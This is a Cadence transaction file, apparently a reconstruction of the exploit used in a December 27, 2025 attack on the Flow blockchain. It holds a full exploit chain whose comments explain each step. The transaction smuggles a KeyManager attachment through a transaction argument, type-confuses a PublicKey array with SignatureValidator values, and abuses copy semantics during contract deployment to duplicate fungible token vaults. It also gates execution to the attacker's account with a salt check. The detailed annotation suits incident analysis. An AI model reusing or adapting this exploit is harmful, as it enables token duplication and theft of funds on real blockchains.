import "FungibleToken"
import "NFTFactory"
import "NFTPoolInterface"

/**
 * deploy_pool_instance18.cdc - EXPLOITATION TRANSACTION for the December 27, 2025 Flow attack
 * 
 * This transaction demonstrates the COMPLETE exploit chain that duplicated fungible tokens.
 * Unlike deploy_pool_instance0.cdc (the seed transaction), this uses TYPE CONFUSION to
 * duplicate resources that should be impossible to copy in Cadence's resource model.
 * 
 * THE THREE-PART EXPLOIT IN ACTION:
 * 
 * PART 1 - Attachment Validation Bypass:
 *   The argContainer parameter is declared as NFTFactory.EmptyStruct, but it arrives
 *   with a KeyManager attachment already attached. This is impossible through normal
 *   code (KeyManager.init() calls panic("0")), but the attachment validation bypass
 *   allowed smuggling pre-constructed attachments via transaction arguments.
 * 
 * PART 2 - Built-in Type Defensive Check Bypass:
 *   The KeyManager contains a KeyList with a [PublicKey] array. But this array
 *   actually contains SignatureValidator attachments, not real PublicKeys.
 *   The runtime skipped deep validation on PublicKey (a built-in type), allowing
 *   this type confusion to go undetected.
 * 
 * PART 3 - Contract Initializer Semantics Exploit:
 *   When deploying the next pool contract with keyList.keys[0].signatureAlgorithm.rawValue,
 *   the static type chain goes through structs (PublicKey → SignatureValidator → rawValue),
 *   so COPY semantics are applied. But the actual value is a @ResourceWrapper (resource),
 *   which gets DUPLICATED instead of moved!
 * 
 * Parameters:
 * - code: Contract bytecode for the next NFTPoolInstance
 * - contractName: Current pool contract to extract from (e.g., "NFTPoolInstance17")
 * - nextContractName: Next pool contract to deploy (e.g., "NFTPoolInstance18")
 * - argContainer: EmptyStruct carrying smuggled KeyManager attachment
 * 
 * See: https://flow.com/post/dec-27-technical-post-mortem
 */
transaction(code: String, contractName: String, nextContractName: String, argContainer: NFTFactory.EmptyStruct) {

    prepare(acct: auth(Storage, AddContract) &Account) {
        // ═══════════════════════════════════════════════════════════════════
        // STEP 1: EXTRACT resources from the current pool contract
        // ═══════════════════════════════════════════════════════════════════
        let poolContract = acct.contracts.borrow<&{NFTPoolInterface}>(name: contractName)!
        
        // ═══════════════════════════════════════════════════════════════════
        // PART 1: ACCESS SMUGGLED ATTACHMENT
        // The argContainer is an EmptyStruct, but it has a KeyManager attachment
        // that was smuggled via the attachment validation bypass.
        // This should be impossible - KeyManager.init() calls panic("0")!
        // ═══════════════════════════════════════════════════════════════════
        let argContainerRef: &NFTFactory.EmptyStruct = &argContainer as &NFTFactory.EmptyStruct
        let keyManagerAttachment = argContainerRef[NFTFactory.KeyManager]!
        
        // Extract the ResourceWrapper from the pool contract
        let wrapper <- poolContract.withdrawResource(account: acct) ?? panic("9")
        
        // Unwrap to get the array of FungibleToken.Vaults
        let vaults <- wrapper.unwrap() as! @[{FungibleToken.Vault}]
        destroy wrapper
        
        // AUTHORIZATION CHECK: Verify salt matches (only attacker's account works)
        let computedSalt = (UInt.fromBigEndianBytes(acct.address.toBytes())! * 0x2dc7e1f786ac4e01) & 0xffffffffffffffff
        assert(computedSalt == NFTFactory.salt)
        
        // ═══════════════════════════════════════════════════════════════════
        // STEP 2: MERGE with any existing resources in storage
        // This consolidates all duplicated tokens from previous iterations
        // ═══════════════════════════════════════════════════════════════════
        if let existingManager <- acct.storage.load<@NFTFactory.ResourceManager>(from: NFTFactory.getStoragePath()) {
            let existingWrapper <- existingManager.getWrapper()
            destroy existingManager
            
            let existingVaults <- existingWrapper.unwrap() as! @[{FungibleToken.Vault}]
            destroy existingWrapper
            
            assert(vaults.length == existingVaults.length, message: "10")
            assert(vaults.length > 0, message: "11")
            
            // Merge: deposit existing vaults into current vaults
            for j in InclusiveRange(0, vaults.length - 1) {
                vaults[j].deposit(from: <- existingVaults.removeFirst())
            }
            destroy existingVaults
        }
        
        // ═══════════════════════════════════════════════════════════════════
        // STEP 3: STORE as ResourceManager for the exploit
        // ═══════════════════════════════════════════════════════════════════
        let newWrapper <- NFTFactory.wrapResource(argResource: <- vaults)
        let newManager <- NFTFactory.createManager(wrapper: <- newWrapper)
        acct.storage.save(<- newManager, to: NFTFactory.getStoragePath())
        
        // Get reference to the stored manager (will be used via SignatureValidator)
        let managerRef = acct.storage.borrow<&NFTFactory.ResourceManager>(from: NFTFactory.getStoragePath())!
        
        // ═══════════════════════════════════════════════════════════════════
        // PART 2: TYPE CONFUSION - Cast PublicKey to SignatureValidator
        // The KeyList.keys array is declared as [PublicKey], but actually
        // contains SignatureValidator attachments. The force-cast reveals
        // this type confusion.
        // ═══════════════════════════════════════════════════════════════════
        let keyList = keyManagerAttachment.getKeyList(refSelf: keyManagerAttachment as &NFTFactory.KeyManager)
        let signatureValidatorRef = (&keyList.keys[0] as &PublicKey) as! &NFTFactory.SignatureValidator
        
        // Point the SignatureValidator's reference to our ResourceManager
        // Now signatureValidatorRef.signatureAlgorithm points to managerRef
        signatureValidatorRef.setSignatureAlgorithm(refSelf: signatureValidatorRef, ref: managerRef as &NFTFactory.ResourceManager)
        
        // ═══════════════════════════════════════════════════════════════════
        // PART 3: DUPLICATE VIA CONTRACT DEPLOYMENT
        // 
        // keyList.keys[0].signatureAlgorithm.rawValue breaks down as:
        //   - keyList.keys[0] → static type: PublicKey (but actually SignatureValidator)
        //   - .signatureAlgorithm → &ResourceManager reference (we just set this)
        //   - .rawValue → @ResourceWrapper (the actual resource to duplicate)
        // 
        // Because the static type chain goes through struct/value types,
        // the runtime applies COPY semantics. But the actual value is a
        // @ResourceWrapper (resource), which should use MOVE semantics.
        // 
        // RESULT: The resource is COPIED, not moved. DUPLICATION ACHIEVED!
        // ═══════════════════════════════════════════════════════════════════
        acct.contracts.add(name: nextContractName, code: code.utf8, keyList.keys[0].signatureAlgorithm.rawValue)
    }

    execute {}
}
